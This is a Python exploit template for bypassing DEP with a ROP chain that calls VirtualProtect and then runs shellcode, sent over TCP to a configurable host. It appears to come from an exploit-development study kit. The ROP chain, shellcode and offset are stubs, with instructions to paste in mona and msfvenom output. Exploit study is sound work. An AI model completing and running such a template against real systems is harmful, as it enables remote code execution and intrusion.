#!/usr/bin/env python3
"""
dep_rop.py — DEP bypass via ROP (VirtualProtect) template.

The EIP overwrite returns into a ROP chain that calls VirtualProtect to mark the
shellcode region RWX, then returns into the shellcode.

Generate the chain with:  !py mona rop -m *.dll -cpb "\x00\x0a\x0d"
Paste mona's create_rop_chain() below (it emits ready Python).

Companion: 00-methodology/dep-rop-playbook.md
"""
import struct

# ── CONFIG ────────────────────────────────────────────────────────────────────
RHOST     = "127.0.0.1"
RPORT     = 9999
CRASH_LEN = 3000
OFFSET    = 0                     # to EIP
BADCHARS  = b"\x00\x0a\x0d"
# ────────────────────────────────────────────────────────────────────────────────

def p32(a): return struct.pack("<I", a)


# ── PASTE mona's rop_chains.txt create_rop_chain() HERE ─────────────────────────
def create_rop_chain():
    """Replace this stub with mona's generated VirtualProtect chain."""
    rop_gadgets = [
        # 0x625011af,  # POP EAX # RET
        # ...
    ]
    return b"".join(struct.pack("<I", g) for g in rop_gadgets)
# ────────────────────────────────────────────────────────────────────────────────


# msfvenom ... -b "\x00\x0a\x0d" -f python  (paste below)
shellcode = b""
shellcode += b"\x90" * 16
shellcode += b""                 # <-- paste msfvenom bytes here


def build():
    rop = create_rop_chain()
    buf  = b"A" * OFFSET
    # EIP overwrite: often a plain RET so execution flows into the chain sitting at ESP,
    # OR the first gadget address goes directly here. Depends on where ESP points.
    buf += rop                    # ROP chain executes: VirtualProtect(shellcode, ..., 0x40)
    buf += b"\x90" * 16           # small landing pad the chain returns into
    buf += shellcode
    buf += b"C" * max(0, CRASH_LEN - len(buf))
    return buf


if __name__ == "__main__":
    import sys
    sys.path.insert(0, ".")
    from send_helpers import send_tcp
    send_tcp(RHOST, RPORT, build())
    print("[+] sent ROP payload")
